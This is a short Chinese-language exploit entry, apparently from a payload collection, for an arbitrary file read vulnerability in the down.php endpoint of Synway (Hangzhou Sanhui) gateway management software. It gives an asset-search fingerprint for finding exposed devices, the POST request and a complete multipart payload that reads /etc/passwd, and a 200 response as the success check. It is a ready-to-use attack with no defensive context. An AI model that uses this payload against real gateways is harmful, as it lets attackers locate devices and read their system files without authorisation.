# 杭州三汇网关down.php存在任意文件读取漏洞

杭州三汇网关 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Synway-网关管理软件"`
- **请求**：`POST /down.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryrjG56nHVKDDdMNQK
Content-Disposition: form-data; name="downfile"
/etc/passwd
------WebKitFormBoundaryrjG56nHVKDDdMNQK
Content-Disposition: form-data; name="down"
下载
------WebKitFormBoundaryrjG56nHVKDDdMNQK
Content-Disposition: form-data; name="runinfoupdate"
```
- **响应特征**：200